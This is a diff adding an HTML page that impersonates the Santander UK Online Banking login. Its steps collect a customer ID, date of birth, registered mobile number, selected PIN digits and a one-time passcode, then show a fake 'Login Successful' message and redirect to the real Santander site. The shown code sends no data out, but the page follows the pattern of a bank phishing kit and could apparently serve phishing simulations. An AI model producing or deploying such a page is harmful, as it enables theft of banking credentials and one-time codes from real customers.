@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Santander UK | Online Banking</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --red: #EC0000; --dred: #b50000; --bg: #F5F5F5; --bk: #1a1a1a; --gt: #555; --gb: #ccc; }
+    body { font-family: Arial, 'Helvetica Neue', sans-serif; background: var(--bg); color: var(--bk); min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: var(--red); padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 68px; box-shadow: 0 2px 6px rgba(0,0,0,.25); }
+    .logo-badge{height:52px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;padding:0 12px;overflow:hidden;flex-shrink:0;}
+    .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .flame { display: flex; flex-direction: column; gap: 3px; }
+    .flame span { display: block; border-radius: 3px; background: #fff; }
+    .logo-name { color: #fff; font-size: 26px; font-weight: 900; letter-spacing: -0.5px; }
+    .header-right { color: rgba(255,255,255,.85); font-size: 12px; }
+    .header-right a { color: #fff; text-decoration: none; margin-left: 16px; font-size: 13px; }
+    .header-right a:hover { text-decoration: underline; }
+    nav { background: #fff; border-bottom: 3px solid var(--red); padding: 0 32px; display: flex; box-shadow: 0 1px 3px rgba(0,0,0,.08); }
+    nav a { font-size: 13px; color: var(--gt); padding: 13px 16px; text-decoration: none; font-weight: 700; border-bottom: 3px solid transparent; margin-bottom: -3px; }
+    nav a:hover { color: var(--bk); }
+    nav a.active { color: var(--red); border-bottom-color: var(--red); }
+    main { flex: 1; display: flex; justify-content: center; padding: 36px 20px 60px; }
+    .wrap { width: 100%; max-width: 980px; display: grid; grid-template-columns: 1fr 300px; gap: 28px; align-items: start; }
+    .card { background: #fff; border-top: 4px solid var(--red); box-shadow: 0 1px 4px rgba(0,0,0,.1); }
+    .card-head { padding: 22px 28px; border-bottom: 1px solid #eee; }
+    .card-head h1 { font-size: 22px; font-weight: 700; }
+    .steps-bar { display: flex; border-bottom: 1px solid #eee; }
+    .sb { flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 4px; font-size: 11px; font-weight: 700; color: #bbb; border-bottom: 3px solid transparent; }
+    .sb.active { color: var(--red); border-bottom-color: var(--red); }
+    .sb.done { color: var(--gt); }
+    .sb-num { width: 20px; height: 20px; border-radius: 50%; background: #eee; color: #999; font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .sb.active .sb-num { background: var(--red); color: #fff; }
+    .sb.done .sb-num { background: #28a745; color: #fff; }
+    .card-body { padding: 28px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
+    .fg input, .fg select { width: 100%; padding: 10px 13px; border: 1px solid var(--gb); font-size: 15px; outline: none; transition: border-color .15s; border-radius: 2px; }
+    .fg input:focus, .fg select:focus { border-color: var(--red); box-shadow: 0 0 0 2px rgba(236,0,0,.1); }
+    .fg select { -webkit-appearance: none; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23666' stroke-width='1.5' fill='none'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 34px; }
+    .hint { font-size: 12px; color: var(--gt); margin-top: 5px; line-height: 1.5; }
+    .btn { width: 100%; padding: 13px; background: var(--red); color: #fff; font-size: 15px; font-weight: 700; border: none; cursor: pointer; transition: background .15s; margin-bottom: 16px; border-radius: 2px; }
+    .btn:hover { background: var(--dred); }
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 10px; }
+    .links a { font-size: 13px; color: var(--red); text-decoration: underline; cursor: pointer; }
+    /* PIN digits step */
+    .pin-info { background: #fff5f5; border: 1px solid #fccbcb; border-left: 4px solid var(--red); padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: #7a0000; line-height: 1.6; }
+    .pin-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .pin-row { display: flex; gap: 14px; flex-wrap: wrap; }
+    .pin-fg { display: flex; flex-direction: column; align-items: center; gap: 6px; }
+    .pin-fg label { font-size: 11px; font-weight: 700; color: var(--red); text-transform: uppercase; letter-spacing: .5px; }
+    .pin-fg input { width: 52px; height: 58px; text-align: center; font-size: 24px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; color: var(--bk); }
+    .pin-fg input:focus { border-color: var(--red); box-shadow: 0 0 0 2px rgba(236,0,0,.1); }
+    /* OTP */
+    .otp-info { background: #fff5f5; border: 1px solid #fccbcb; border-left: 4px solid var(--red); padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: #7a0000; line-height: 1.6; }
+    .otp-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 6px; }
+    .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1px solid var(--gb); border-radius: 2px; outline: none; color: var(--bk); }
+    .otp-boxes input:focus { border-color: var(--red); box-shadow: 0 0 0 2px rgba(236,0,0,.1); }
+    .resend { font-size: 12px; color: var(--gt); margin-bottom: 22px; }
+    .resend a { color: var(--red); text-decoration: underline; }
+    /* Granted */
+    .granted { text-align: center; padding: 20px 0; }
+    .tick { width: 72px; height: 72px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: var(--dred); margin-bottom: 10px; }
+    .granted p { font-size: 14px; color: var(--gt); line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: #fff5f5; border: 1px solid #fccbcb; padding: 14px; font-size: 13px; color: #7a0000; border-radius: 2px; }
+    .redir strong { display: block; font-size: 15px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 5px; background: #fccbcb; border-radius: 2px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: var(--red); }
+    .side { display: flex; flex-direction: column; gap: 20px; }
+    .ibox { background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+    .ibox-h { background: var(--red); padding: 12px 16px; color: #fff; font-size: 13px; font-weight: 700; }
+    .ibox-b { padding: 16px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .ibox-b a { color: var(--red); text-decoration: underline; }
+    .ibox-b p { margin-bottom: 8px; }
+    .warn { background: #FFF8E1; border: 1px solid #F0C040; border-left: 4px solid #e6a817; padding: 14px 16px; font-size: 12px; color: #5A4500; line-height: 1.5; }
+    footer { background: #2a2a2a; padding: 20px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; margin-bottom: 12px; }
+    .flinks a { color: #aaa; font-size: 12px; text-decoration: none; padding: 0 12px; border-right: 1px solid #444; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child { border-right: none; }
+    .fcopy { color: #666; font-size: 11px; line-height: 1.6; }
+    @media (max-width: 720px) { .wrap { grid-template-columns: 1fr; } header, nav { padding-left: 16px; padding-right: 16px; } }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+<header>
+  <a class="logo" href="#"><div class="logo-badge"><img src="data:image/png;base64,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" alt="Santander" style="width:140px;height:44px;object-fit:contain;"/></div></a>
+  <div class="header-right">
+    <a href="#">Personal</a>
+    <a href="#">Business</a>
+    <a href="#">Corporate</a>
+    <a href="#">Help</a>
+  </div>
+</header>
+<nav>
+  <a href="#">Accounts</a>
+  <a href="#">Mortgages</a>
+  <a href="#">Savings</a>
+  <a href="#">Loans</a>
+  <a href="#" class="active">Online Banking</a>
+</nav>
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="card-head"><h1>Log in to Online Banking</h1></div>
+      <div class="steps-bar">
+        <div class="sb active" id="sb1"><span class="sb-num">1</span> Your details</div>
+        <div class="sb" id="sb2"><span class="sb-num">2</span> PIN digits</div>
+        <div class="sb" id="sb3"><span class="sb-num">3</span> One-time code</div>
+        <div class="sb" id="sb4"><span class="sb-num">4</span> Access granted</div>
+      </div>
+      <div class="card-body">
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="cid">Customer ID</label>
+            <input type="text" id="cid" autocomplete="username" inputmode="numeric" />
+            <p class="hint">Your Customer ID is a unique number sent to you when you registered. It's not your account number.</p>
+          </div>
+          <div class="fg">
+            <label for="dob">Date of birth</label>
+            <input type="text" id="dob" placeholder="DD/MM/YYYY" />
+            <p class="hint">Enter in the format DD/MM/YYYY.</p>
+          </div>
+          <div class="fg">
+            <label for="san-mobile">Registered mobile number</label>
+            <input type="tel" id="san-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
+            <p class="hint">We&rsquo;ll send your one-time passcode to this number in step 3.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your Customer ID?</a>
+            <a href="#">Register for Online Banking</a>
+          </div>
+        </div>
+        <!-- STEP 2: PIN digits -->
+        <div class="step" id="step2">
+          <div class="pin-info">
+            <strong>Enter specific digits of your PIN</strong>
+            For your security, we only ask for three digits of your 5-digit PIN. Never share your full PIN with anyone.
+          </div>
+          <div class="fg">
+            <label>Please enter the following PIN digits</label>
+            <div class="pin-row" id="pin-row"></div>
+            <p class="hint" style="margin-top:12px;">Use the drop-downs to select each digit.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back</a>
+            <a href="#">Forgotten your PIN?</a>
+          </div>
+        </div>
+        <!-- STEP 3: OTP -->
+        <div class="step" id="step3">
+          <div class="otp-info">
+            <strong>One-time passcode sent</strong>
+            We've sent a 6-digit code to your registered mobile number ending <strong id="san-mobile-hint"></strong>. Enter it below. It expires in 10 minutes.
+          </div>
+          <div class="fg">
+            <label>Enter your 6-digit code</label>
+            <div class="otp-boxes">
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="san-otp" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend">Didn't receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use the Santander app</a></p>
+          <button class="btn" onclick="goWithLoader(4,this)">Verify &amp; Log in</button>
+          <hr />
+          <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
+        </div>
+        <!-- STEP 4 -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick"><svg width="38" height="38" viewBox="0 0 38 38" fill="none"><path d="M8 19l8 8 14-14" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+            <h2>Login Successful</h2>
+            <p>You are now logged in to Santander Online Banking.</p>
+            <div class="redir">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the Santander website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#EC0000;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="2" y="4" width="14" height="10" rx="2" stroke="#EC0000" stroke-width="1.5"/><path d="M2 8h14" stroke="#EC0000" stroke-width="1.5"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#EC0000;background:#FEE8E8;padding:3px 10px;border-radius:20px;">Cashback</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#EC0000;line-height:1;margin-bottom:6px;">1% back</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Santander Edge Up Account</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Earn up to 1% cashback on household bills and everyday spending. Plus 3.5% AER on a linked Edge Saver. £3/month fee, often offset by cashback earned.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#EC0000;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Learn about Edge Up <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#EC0000" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#EC0000;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M2 9l7-7 7 7M4 7.5V16h10V7.5" stroke="#EC0000" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#EC0000;background:#FEE8E8;padding:3px 10px;border-radius:20px;">Mortgages</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#EC0000;line-height:1;margin-bottom:6px;">From 4.14%</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Find your mortgage deal</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Whether buying your first home or remortgaging, explore Santander's competitive fixed and tracker mortgage rates with our quick online calculator.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#EC0000;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Get a mortgage quote <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#EC0000" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="warn"><strong>Fraud warning:</strong> Santander will never call and ask you to move money, share your PIN or full password, or install remote access software. <a href="#" style="color:#856404">Report a scam</a>.</div>
+      <div class="ibox">
+        <div class="ibox-h">Santander Mobile App</div>
+        <div class="ibox-b">
+          <p>Manage your money anywhere with the Santander UK app. Fast login with Face ID or fingerprint.</p>
+          <p><a href="#">Download for iOS</a></p>
+          <p><a href="#">Download for Android</a></p>
+        </div>
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Need help?</div>
+        <div class="ibox-b">
+          <p><strong>0800 9 123 123</strong><br/>Freephone, available 24/7</p>
+          <p><a href="#">Visit our Help Centre</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy policy</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms &amp; conditions</a><a href="#">Security</a><a href="#">Contact us</a>
+  </div>
+  <p class="fcopy">Santander UK plc. Registered Office: 2 Triton Square, Regent's Place, London NW1 3AN. Registered No. 2294747. Registered in England and Wales.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+</footer>
+<script>
+  var pinPositions = [];
+  (function(){
+    var used = {};
+    while(pinPositions.length < 3){ var n=Math.floor(Math.random()*5)+1; if(!used[n]){used[n]=true;pinPositions.push(n);} }
+    pinPositions.sort(function(a,b){return a-b;});
+    var row = document.getElementById('pin-row');
+    pinPositions.forEach(function(p){
+      var s=['1st','2nd','3rd','4th','5th'][p-1];
+      var fg = document.createElement('div'); fg.className='pin-fg';
+      var sel = '<select style="width:52px;height:58px;text-align:center;font-size:20px;font-weight:700;border:1px solid #ccc;border-radius:2px;outline:none;"><option value="">-</option>';
+      for(var i=0;i<=9;i++) sel+='<option>'+i+'</option>';
+      sel+='</select>';
+      fg.innerHTML='<label>'+s+'</label>'+sel;
+      row.appendChild(fg);
+    });
+  })();
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+  function go(n){
+    if (n === 3) {
+      var raw = document.getElementById('san-mobile').value.replace(/\s/g, '');
+      var hint = raw.length >= 2 ? '●●●●' + raw.slice(-2) : (raw || '●●●●??');
+      document.getElementById('san-mobile-hint').textContent = hint;
+    }
+    document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active');});
+    ['sb1','sb2','sb3','sb4'].forEach(function(id,i){
+      var el=document.getElementById(id); el.classList.remove('active','done');
+      if(i+1<n) el.classList.add('done'); else if(i+1===n) el.classList.add('active');
+    });
+    document.getElementById('step'+n).classList.add('active');
+    if(n===4) redirect();
+  }
+  function redirect(){
+    var s=5,fill=document.getElementById('pfill'),txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){fill.style.width='100%';},50);
+    var iv=setInterval(function(){s--;if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://www.santander.co.uk';},400);}else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');},1000);
+  }
+  var sanOtp=document.querySelectorAll('.san-otp');
+  sanOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'');if(this.value&&i<sanOtp.length-1)sanOtp[i+1].focus();});
+    inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value&&i>0)sanOtp[i-1].focus();});
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#EC0000;animation:ld-spin .8s linear infinite;"></div>
+    </div>
